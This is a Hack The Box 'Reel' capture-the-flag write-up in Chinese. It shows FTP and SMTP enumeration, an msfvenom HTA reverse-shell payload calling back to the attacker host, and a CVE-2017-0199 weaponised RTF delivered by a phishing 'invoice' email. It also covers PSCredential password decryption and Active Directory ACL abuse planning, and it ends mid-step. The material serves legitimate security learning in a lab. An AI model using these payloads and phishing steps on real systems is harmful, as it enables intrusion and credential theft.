---
title: HTB-Reel Writeup
date: 2026-06-01T10:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
  - AppLocker
  - SMTP
  - FTP
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sudo nmap --min-rate 10000 -p- 10.129.30.46 -oA Nmap/ports
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 22:33 -0400
Nmap scan report for 10.129.30.46
Host is up (0.088s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sudo nmap -sT -sC -sV -O -p 21,22,25,135,139,445,593,49159 10.129.30.46
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 22:36 -0400
Nmap scan report for 10.129.30.46
Host is up (0.087s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.98%I=7%D=5/6%Time=69FBFAB5%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-07T02:39:24
|_  start_date: 2026-05-07T02:25:51
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -19m58s, deviation: 34m35s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2026-05-07T03:39:26+01:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.74 seconds

```

21 端口允许匿名登录。

## FTP 渗透

使用 ftp 匿名登录，拿下里面的文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ ftp 10.129.30.46
Connected to 10.129.30.46.
220 Microsoft FTP Service
Name (10.129.30.46:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41002|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||41003|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *
mget AppLocker.docx [anpqy?]? y
229 Entering Extended Passive Mode (|||41005|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************|  2047       25.22 KiB/s    00:00 ETA
226 Transfer complete.
2047 bytes received in 00:00 (24.82 KiB/s)
mget readme.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||41006|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************|   124        1.49 KiB/s    00:00 ETA
226 Transfer complete.
124 bytes received in 00:00 (1.46 KiB/s)
mget Windows Event Forwarding.docx [anpqy?]? y
229 Entering Extended Passive Mode (|||41007|)
125 Data connection already open; Transfer starting.
100% |*****************************************************************************************************************************************************| 14581       87.18 KiB/s    00:00 ETA
226 Transfer complete.
14581 bytes received in 00:00 (86.66 KiB/s)
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ ls -liah
total 36K
2794142 drwxrwxr-x  3 kali kali 4.0K May  6 22:44  .
2759041 drwxrwxr-x 15 kali kali 4.0K May  6 22:25  ..
2794155 -rw-rw-r--  1 kali kali 2.0K May 28  2018  AppLocker.docx
2794156 -rw-rw-r--  1 kali kali  124 May 28  2018  readme.txt
2794157 -rw-rw-r--  1 kali kali  15K Oct 31  2017 'Windows Event Forwarding.docx'
```

使用 exiftool 查看信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]                                    
└─$ exiftool AppLocker.docx Windows\ Event\ Forwarding.docx           
======== AppLocker.docx                                               
ExifTool Version Number         : 13.50                               
File Name                       : AppLocker.docx                      
Directory                       : .                                   
File Size                       : 2.0 kB                              
File Modification Date/Time     : 2018:05:28 19:19:48-04:00           
File Access Date/Time           : 2026:05:06 22:44:17-04:00           
File Inode Change Date/Time     : 2026:05:06 22:44:17-04:00           
File Permissions                : -rw-rw-r--                          
File Type                       : DOCX                                
File Type Extension             : docx                                
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document                                                     
Zip Required Version            : 20                                  
Zip Bit Flag                    : 0x0008                              
Zip Compression                 : Deflated                            
Zip Modify Date                 : 2018:05:29 00:19:50                 
Zip CRC                         : 0x3cdd8b4f                          
Zip Compressed Size             : 166                                 
Zip Uncompressed Size           : 284 
Zip File Name                   : _rels/.rels                         
======== Windows Event Forwarding.docx                                
ExifTool Version Number         : 13.50                                        
File Name                       : Windows Event Forwarding.docx
Directory                       : .                                            
File Size                       : 15 kB                                        
File Modification Date/Time     : 2017:10:31 17:13:23-04:00
File Access Date/Time           : 2026:05:06 22:44:20-04:00
File Inode Change Date/Time     : 2026:05:06 22:44:20-04:00
File Permissions                : -rw-rw-r--                                   
File Type                       : DOCX                                         
File Type Extension             : docx                                         
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document                                                     
Zip Required Version            : 20                                           
Zip Bit Flag                    : 0x0006                                       
Zip Compression                 : Deflated                                     
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409                                   
Zip Compressed Size             : 385                                          
Zip Uncompressed Size           : 1422                                         
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4                                            
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm                                  
Total Edit Time                 : 5 minutes                                    
Pages                           : 2                                            
Words                           : 299                                          
Characters                      : 1709                                         
Application                     : Microsoft Office Word
Doc Security                    : None                                         
Lines                           : 14                                           
Paragraphs                      : 4                                            
Scale Crop                      : No                                           
Heading Pairs                   : Title, 1                                     
Titles Of Parts                 :                                              
Company                         :                                              
Links Up To Date                : No                                           
Characters With Spaces          : 2004                                         
Shared Doc                      : No                                           
Hyperlinks Changed              : No                                           
App Version                     : 14.0000                                      
    2 image files read
```

发现一个用户 `nico@megabank.com`，记录下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ vim mail.txt     
                                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ cat mail.txt        
nico@megabank.com

```

详细阅读下载下来的文件内容。

![](Pasted%20image%2020260507105135.png)

`AppLocker` 程序需要记录 `exe`、`msi` 和脚本 `ps1、vbs、cmd、bat、js` 的 hash 规则生效。

`AppLocker` 是 Windows 内置的一项应用程序白名单安全功能，允许管理员自定义策略，精确控制哪些程序可以在系统上运行。

- 可执行文件 `exe`、`com`
- Windows 安装程序 `msi`、`msp`
- 脚本文件 `ps1`、`vbs`、`cmd`、`bat`、`js`
- DLL 动态链接库
- 应用包 `appx`

意思是只有哈希值匹配的白名单程序才能运行，即 `exe`、`msi`、`ps1`、`vbs`、`cmd`、`bat`、`js` 均被拦截。

![](Pasted%20image%2020260507105244.png)

![](Pasted%20image%2020260507105300.png)

## SMTP 渗透

测试 SMTP 的通讯情况。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ telnet 10.129.30.46 25                     
Trying 10.129.30.46...
Connected to 10.129.30.46.
Escape character is '^]'.
220 Mail Service ready
HELO test
250 Hello.
MAIL FROM: <enil@admin.com>
250 OK
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <administrator@megabank.com>
550 Unknown user
```

使用 msfvenom 制作一个恶意脚本 `enil.hta`。

由于 `hta` 不在 `AppLocker` 的拓展名中，所以不会对其进行 hash 校验。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]                                                               
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=443 -f hta-psh -o msfv.hta                                                                                                      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload           
[-] No arch selected, selecting arch: x86 from the payload                                       
No encoder specified, outputting raw payload                                                     
Payload size: 324 bytes                                                                          
Final size of hta-psh file: 7279 bytes          
Saved as: msfv.hta

```

## CVE-2017-0199

`CVE-2017-0199` 的本质是 Office 处理 OLE2Link 远程对象的一个逻辑错误。

- RTF 内嵌一个 OLE link，指向一个远程 url
- Word 打开文档时会通过 URL Moniker 自动拉取远程对象
- 当远程返回的内容是 HTA 时，Office 没把它当数据渲染，而是顺着内容类型把他交给 `mshta.exe` 执行

在 Github 上寻找到一个利用仓库，克隆下来。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ git clone https://github.com/bhdresh/CVE-2017-0199.git     
Cloning into 'CVE-2017-0199'...
remote: Enumerating objects: 298, done.
remote: Total 298 (delta 0), reused 0 (delta 0), pack-reused 298 (from 1)
Receiving objects: 100% (298/298), 288.09 KiB | 2.10 MiB/s, done.
Resolving deltas: 100% (102/102), done.
                                                                                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ ls -liah CVE-2017-0199
total 64K
2794286 drwxrwxr-x 4 kali kali 4.0K May 30 06:23 .
2794142 drwxrwxr-x 5 kali kali 4.0K May 30 06:23 ..
2794365 -rw-rw-r-- 1 kali kali  36K May 30 06:23 cve-2017-0199_toolkit.py
2794287 drwxrwxr-x 7 kali kali 4.0K May 30 06:23 .git
2794317 -rw-rw-r-- 1 kali kali 5.0K May 30 06:23 README.md
2794366 drwxrwxr-x 2 kali kali 4.0K May 30 06:23 template
2794364 -rw-rw-r-- 1 kali kali   20 May 30 06:23 TODO.txt
```

给脚本添加可执行权限，查看详细帮助。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel/CVE-2017-0199]
└─$ chmod +x cve-2017-0199_toolkit.py 
                                                                                                                                                                        

┌──(kali㉿kali)-[~/Work/Kali/Reel/CVE-2017-0199]
└─$ python2 cve-2017-0199_toolkit.py -h

This is a handy toolkit to exploit CVE-2017-0199 (Microsoft Office RCE)

Modes:

 -M gen                                          Generate Malicious file only

             Generate malicious payload:

             -w <Filename.rtf/Filename.ppsx>     Name of malicious RTF/PPSX file (Share this file with victim).

             -u <http://attacker.com/test.hta>   The path to an HTA/SCT file. Normally, this should be a domain or IP where this tool is running.

                                                 For example, http://attacker.com/test.doc (This URL will be included in malicious file and

                                                 will be requested once victim will open malicious RTF/PPSX file.

             -t RTF|PPSX (default = RTF)         Type of the file to be generated.

             -x 0|1  (RTF only)                  Generate obfuscated RTF file. 0 = Disable, 1 = Enable.

 -M exp                                          Start exploitation mode

             Exploitation:

             -t RTF|PPSX (default = RTF)         Type of file to be exolited.

             -H </tmp/custom>                    Local path of a custom HTA/SCT file which needs to be delivered and executed on target.

                                                 NOTE: This option will not deliver payloads specified through options "-e" and "-l".

             -p <TCP port:Default 80>            Local port number.

             -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

             -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.
```

按照帮助的提示编写漏洞执行语句，生成 `invo.rtf`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]              
└─$ python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invo.rtf -u http://10.10.16.15/msfv.hta -t rtf -x 0                    
Generating normal RTF payload.                  

Generated invo.rtf successfully 
```

使用 `sendEmail` 给 `nico` 发邮件并附上 `invo.rtf`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sendEmail -f enil@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a invo.rtf -s 10.129.173.182 -v 
May 31 03:41:48 kali sendEmail[4463]: DEBUG => Connecting to 10.129.173.182:25
May 31 03:41:48 kali sendEmail[4463]: DEBUG => My IP address is: 10.10.16.15
May 31 03:41:48 kali sendEmail[4463]: SUCCESS => Received:      220 Mail Service ready
May 31 03:41:48 kali sendEmail[4463]: INFO => Sending:  EHLO kali
May 31 03:41:49 kali sendEmail[4463]: SUCCESS => Received:      250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
May 31 03:41:49 kali sendEmail[4463]: INFO => Sending:  MAIL FROM:<enil@megabank.com>
May 31 03:41:49 kali sendEmail[4463]: SUCCESS => Received:      250 OK
May 31 03:41:49 kali sendEmail[4463]: INFO => Sending:  RCPT TO:<nico@megabank.com>
May 31 03:41:49 kali sendEmail[4463]: SUCCESS => Received:      250 OK
May 31 03:41:49 kali sendEmail[4463]: INFO => Sending:  DATA
May 31 03:41:49 kali sendEmail[4463]: SUCCESS => Received:      354 OK, send.
May 31 03:41:49 kali sendEmail[4463]: INFO => Sending message body
May 31 03:41:49 kali sendEmail[4463]: Setting content-type: text/plain
May 31 03:41:49 kali sendEmail[4463]: DEBUG => Sending the attachment [invo.rtf]
May 31 03:42:00 kali sendEmail[4463]: SUCCESS => Received:      250 Queued (11.224 seconds)
May 31 03:42:00 kali sendEmail[4463]: Email was sent successfully!  From: <enil@megabank.com> To: <nico@megabank.com> Subject: [Invoice Attached] Attachment(s): [invo.rtf] Server: [10.129.173.182:25]
```

在本地开启一个服务器，端口为 80。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.173.182 - - [31/May/2026 03:42:09] "GET /msfv.hta HTTP/1.1" 304 -
```

开启一个监听，等待片刻收到 bash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ sudo rlwrap -cAr nc -lvnp 443                              
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.173.182] 51541
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
htb\nico

```

可以查看到 user flag。

```bash
C:\Users\nico\Desktop>type user.txt
type user.txt
a1927c75*******5ab493ab8be66f74
```

## 提权至 tom

在 `nico` 的 `Desktop` 下发现一个凭据 `cred.xml`。

这个 `cred.xml` 是 PowerShell 的 `Export-Clixml` 导出的一个 `PSCredential` 对象。

```bash
C:\Users\nico\Desktop>type cred.xml
type cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

使用 `Import-Clixml` + `GetNetworkCredential().Password` 可以解密出来密码为 `1ts-mag1c!!!`。

```bash
C:\Windows\system32>powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
1ts-mag1c!!!
```

使用 ssh 可以登陆到 `tom`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]              
└─$ ssh tom@10.129.173.182                      
The authenticity of host '10.129.173.182 (10.129.173.182)' can't be established.
ED25519 key fingerprint is: SHA256:fIZnS9nEVF3o86fEm/EKspTgedBr8TvFR0i3Pzk40EQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.173.182' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tom@10.129.173.182's password: 
Microsoft Windows [Version 6.3.9600]            
(c) 2013 Microsoft Corporation. All rights reserved.                                             

tom@REEL C:\Users\tom>whoami                    
htb\tom 
```

## 提权至 administrator

浏览 `tom` 的 `Desktop` 发现 Bloodhound 执行的结果 `acls.csv `。

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit>dir  
Volume in drive C has no label.  
Volume Serial Number is CEBA-B613  
  
Directory of C:\Users\tom\Desktop\AD Audit  
  
05/29/2018 09:02 PM <DIR> .  
05/29/2018 09:02 PM <DIR> ..  
05/30/2018 12:44 AM <DIR> BloodHound  
05/29/2018 09:02 PM 182 note.txt  
1 File(s) 182 bytes  
3 Dir(s) 4,926,689,280 bytes free  
  
tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt  
Findings:  
  
Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).  
  
Maybe we should re-run Cypher query against other groups we've created.  
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir  
Volume in drive C has no label.  
Volume Serial Number is CEBA-B613  
  
Directory of C:\Users\tom\Desktop\AD Audit\BloodHound  
  
05/30/2018 12:44 AM <DIR> .  
05/30/2018 12:44 AM <DIR> ..  
05/29/2018 08:57 PM <DIR> Ingestors  
10/30/2017 11:15 PM 769,587 PowerView.ps1  
1 File(s) 769,587 bytes  
3 Dir(s) 4,926,685,184 bytes free  
  
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>cd Ingestors  
  
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>dir  
Volume in drive C has no label.  
Volume Serial Number is CEBA-B613  
  
Directory of C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors  
  
05/29/2018 08:57 PM <DIR> .  
05/29/2018 08:57 PM <DIR> ..  
11/17/2017 12:50 AM 112,225 acls.csv  
10/28/2017 09:50 PM 3,549 BloodHound.bin  
10/24/2017 04:27 PM 246,489 BloodHound_Old.ps1  
10/24/2017 04:27 PM 568,832 SharpHound.exe  
10/24/2017 04:27 PM 636,959 SharpHound.ps1  
5 File(s) 1,568,054 bytes  
2 Dir(s) 4,926,685,184 bytes free
```

启动 smbserver 将 `acls.csv` 复制到 Kali 中。

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors>copy acls.csv \\10.10.16.15\share\                                  
        1 file(s) copied.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ impacket-smbserver share . -smb2support

┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ ls -liah acls.csv   
2794371 -rwxrwxr-x 1 kali kali 110K May 29  2018 acls.csv
```

浏览 `acls.csv` 发现了一条可提权的路径。

`tom` -> `claire` -> `Backup_Admins`

```bash
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ head -n 10 acls.csv                                            
"ObjectName","ObjectType","ObjectGuid","PrincipalName","PrincipalType","ActiveDirectoryRights","ACEType","AccessControlType","IsInherited"
"Domain Computers@HTB.LOCAL","GROUP","","Domain Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"
"Domain Computers@HTB.LOCAL","GROUP","","Account Operators@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"
"Domain Computers@HTB.LOCAL","GROUP","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"
"Domain Computers@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","ExtendedRight","User-Force-Change-Password","AccessAllowed","True"
"Domain Computers@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteProperty","Member","AccessAllowed","True"
"Domain Computers@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","True"
"Domain Computers@HTB.LOCAL","GROUP","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","True"
"Domain Computers@HTB.LOCAL","GROUP","","Enterprise Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","True"
"Domain Computers@HTB.LOCAL","GROUP","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","True"
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ cat acls.csv| grep -i 'tom@'
"tom@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Enterprise Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","Owner","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Reel]
└─$ cat acls.csv| grep -i 'claire@'
"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Account Operators@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","ExtendedRight","User-Force-Change-Password","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteProperty","Member","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Enterprise Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","Owner","","AccessAllowed","False"
```

具体而言是 `tom（WriteOwner）` --> `claire（WriteDacl）` --> `Backup_Admins`

```bash
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"
```

加载 `PowerView`。

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit\BloodHound>dir                                                                           
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CEBA-B613                                                                                              

